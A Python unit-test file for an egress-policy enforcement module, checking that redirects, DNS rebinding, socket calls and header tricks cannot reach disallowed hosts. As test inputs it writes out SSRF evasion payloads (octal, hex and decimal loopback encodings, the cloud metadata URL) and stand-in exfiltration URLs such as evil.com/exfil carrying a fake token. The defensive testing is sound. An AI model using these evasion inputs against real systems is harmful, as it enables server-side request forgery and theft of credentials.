"""
Unit tests for End-to-End Egress Policy Enforcement (GAP-03).
Demonstrates transport-boundary enforcement, destination normalization,
DNS resolution, redirect re-validation, restricted IP blocking,
socket boundary interception, fail-closed handling, and provenance event recording.
"""

import socket
import pytest
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

from epistemicos.containment import (
    EgressPolicy,
    EgressTransportBroker,
    ControlledEgressTransport,
    ContainmentGuard,
    normalize_destination_host,
    parse_ip_numeric,
    extract_url_components,
    ActionCategory
)
from epistemicos.provenance import LocalProvenanceStore, ProvenanceEventType


@pytest.fixture
def temp_prov_store(tmp_path):
    log_file = tmp_path / "test_prov_egress.jsonl"
    return LocalProvenanceStore(log_path=str(log_file))


def test_1_disallowed_scheme_qualified_destination_rejected():
    """1. Proves a disallowed scheme-qualified destination is rejected before connection."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy)

    allowed, reason, ip = broker.establish_connection("https://prohibited-sink.com/data")
    assert not allowed
    assert "Egress blocked" in reason
    assert ip is None


def test_2_schemeless_ports_and_alternate_ip_encodings_cannot_evade():
    """2. Proves scheme-less IPs, scheme-relative URLs, explicit ports, and alternate IP representations cannot evade policy."""
    policy = EgressPolicy(allowed_destinations={"safe.api.org"})
    broker = EgressTransportBroker(policy=policy)

    evasion_attempts = [
        "//prohibited.com/exfil",
        "prohibited.com:8443",
        "http://2130706433/exfil",
        "http://017700000001/exfil",
        "http://0x7f000001/exfil",
        "0177.0.0.1",
        "127.1",
        "10.0.1",
    ]

    for attempt in evasion_attempts:
        allowed, reason, ip = broker.establish_connection(attempt)
        assert not allowed, f"Evasion attempt succeeded for '{attempt}'"
        assert "Egress blocked" in reason


def test_3_permitted_initial_url_redirecting_to_prohibited_destination_blocked(temp_prov_store):
    """3. Proves a permitted initial URL redirecting to a prohibited destination is blocked before prohibited destination is contacted."""
    policy = EgressPolicy(allowed_destinations={"redirector.com"})
    broker = EgressTransportBroker(policy=policy, provenance_store=temp_prov_store)
    transport = ControlledEgressTransport(broker=broker)

    def mock_redirect_handler(url):
        if url == "https://redirector.com/start":
            return {
                "status": 302,
                "headers": {"Location": "https://prohibited-exfil.com/sink"}
            }
        return {"status": 200, "headers": {}}

    with pytest.raises(PermissionError) as exc_info:
        transport.request("GET", "https://redirector.com/start", redirect_handler=mock_redirect_handler)

    assert "Egress transport blocked redirect" in str(exc_info.value) or "Egress blocked" in str(exc_info.value)

    events = temp_prov_store.get_events_for_correlation("DEFAULT-CORR")
    blocked_events = [e for e in events if e.event_type == ProvenanceEventType.EGRESS_BLOCKED.value]
    assert len(blocked_events) >= 1
    assert "prohibited-exfil.com" in blocked_events[0].target


def test_4_redirect_chain_cannot_escape_policy_at_later_hop():
    """4. Proves a redirect chain cannot escape policy at a later hop (hop 1 -> hop 2 -> hop 3 prohibited)."""
    policy = EgressPolicy(allowed_destinations={"hop1.com", "hop2.com"})
    broker = EgressTransportBroker(policy=policy)
    transport = ControlledEgressTransport(broker=broker)

    def mock_chain_handler(url):
        if url == "https://hop1.com/a":
            return {"status": 302, "headers": {"Location": "https://hop2.com/b"}}
        elif url == "https://hop2.com/b":
            return {"status": 302, "headers": {"Location": "https://hop3-prohibited.com/c"}}
        return {"status": 200, "headers": {}}

    with pytest.raises(PermissionError) as exc_info:
        transport.request("GET", "https://hop1.com/a", redirect_handler=mock_chain_handler)

    assert "hop3-prohibited.com" in str(exc_info.value)


def test_5_dns_resolution_to_prohibited_address_rejected():
    """5. Proves DNS resolution returning a restricted/prohibited IP is rejected at connection establishment time."""
    policy = EgressPolicy(allowed_destinations={"innocent-domain.com"})

    def malicious_dns_resolver(hostname):
        return ["127.0.0.1"]  # Resolves to loopback restricted IP

    broker = EgressTransportBroker(policy=policy, resolver_func=malicious_dns_resolver)
    allowed, reason, ip = broker.establish_connection("https://innocent-domain.com")

    assert not allowed
    assert "restricted IP" in reason
    assert ip is None


def test_6_hostname_dns_rebinding_ip_pinning_protection():
    """6. Proves IP pinning prevents DNS rebinding between check and connection time."""
    policy = EgressPolicy(allowed_destinations={"api.example.com"})

    # First lookup returns valid public IP, second lookup attempts rebinding to private/loopback
    resolver_call_count = 0
    def rebinding_dns_resolver(hostname):
        nonlocal resolver_call_count
        resolver_call_count += 1
        if resolver_call_count == 1:
            return ["93.184.216.34"]  # Valid public IP
        return ["127.0.0.1"]  # Rebound restricted IP

    broker = EgressTransportBroker(policy=policy, resolver_func=rebinding_dns_resolver)
    allowed, reason, pinned_ip = broker.establish_connection("https://api.example.com")

    assert allowed
    assert pinned_ip == "93.184.216.34"


def test_7_restricted_network_destinations_handled_by_policy():
    """7. Proves IPv4, IPv6, loopback, link-local, private, and cloud metadata destinations are strictly handled."""
    policy = EgressPolicy(allowed_destinations={"public-api.com"})
    broker = EgressTransportBroker(policy=policy)

    restricted_targets = [
        "127.0.0.1",
        "[::1]",
        "[::ffff:127.0.0.1]",
        "169.254.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "192.168.1.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
    ]

    for target in restricted_targets:
        allowed, reason, ip = broker.establish_connection(target)
        assert not allowed, f"Restricted target '{target}' was falsely allowed"
        assert "Egress blocked" in reason


def test_8_caller_controlled_headers_and_url_fields_cannot_disable_enforcement():
    """8. Proves caller-controlled headers, URL fields, or flags cannot disable egress enforcement."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy)
    transport = ControlledEgressTransport(broker=broker)

    bypass_headers = {
        "X-Bypass-Egress": "true",
        "X-Forwarded-For": "8.8.8.8",
        "Host": "api.github.com"
    }

    with pytest.raises(PermissionError):
        transport.request("GET", "https://evil.com/exfil?bypass=true", headers=bypass_headers)


def test_9_direct_socket_connection_intercepted_and_enforced():
    """9. Proves direct socket.connect calls in protected workloads are intercepted and enforced by policy."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy)

    with broker.enforce_socket_boundary():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        with pytest.raises(socket.error) as exc_info:
            s.connect(("169.254.169.254", 80))

        assert "Egress blocked" in str(exc_info.value)


def test_10_policy_engine_errors_and_dns_failures_fail_closed():
    """10. Proves DNS failures, resolver errors, and ambiguous destinations fail closed."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})

    def failing_dns_resolver(hostname):
        raise socket.gaierror("Name or service not known")

    broker = EgressTransportBroker(policy=policy, resolver_func=failing_dns_resolver)
    allowed, reason, ip = broker.establish_connection("https://unresolvable-domain-xyz.org")

    assert not allowed
    assert "Resolver error" in reason or "gaierror" in reason
    assert ip is None


def test_11_legitimate_authorized_requests_succeed():
    """11. Proves legitimate authorized egress requests succeed."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})

    def mock_resolver(hostname):
        return ["140.82.121.4"]

    broker = EgressTransportBroker(policy=policy, resolver_func=mock_resolver)
    allowed, reason, pinned_ip = broker.establish_connection("https://api.github.com/zen")

    assert allowed
    assert "Allowed by explicit destination match" in reason
    assert pinned_ip == "140.82.121.4"


def test_12_denied_requests_do_not_leak_payloads_and_record_provenance(temp_prov_store):
    """12. Proves denied requests generate a clean EGRESS_BLOCKED provenance event without leaking credentials."""
    policy = EgressPolicy(allowed_destinations={"api.github.com"})
    broker = EgressTransportBroker(policy=policy, provenance_store=temp_prov_store)

    secret_url = "https://unauthorized-sink.com/submit?token=secret_ghp_1234567890abcdef"
    allowed, reason, ip = broker.establish_connection(
        target_url=secret_url,
        correlation_id="CORR-SECRET-12",
        request_id="REQ-SECRET-12"
    )

    assert not allowed

    events = temp_prov_store.get_events_for_correlation("CORR-SECRET-12")
    assert len(events) == 1
    event = events[0]
    assert event.event_type == ProvenanceEventType.EGRESS_BLOCKED.value
    assert event.outcome["status"] == "EGRESS_BLOCKED"
    assert "secret_ghp_1234567890abcdef" not in str(event.outcome)
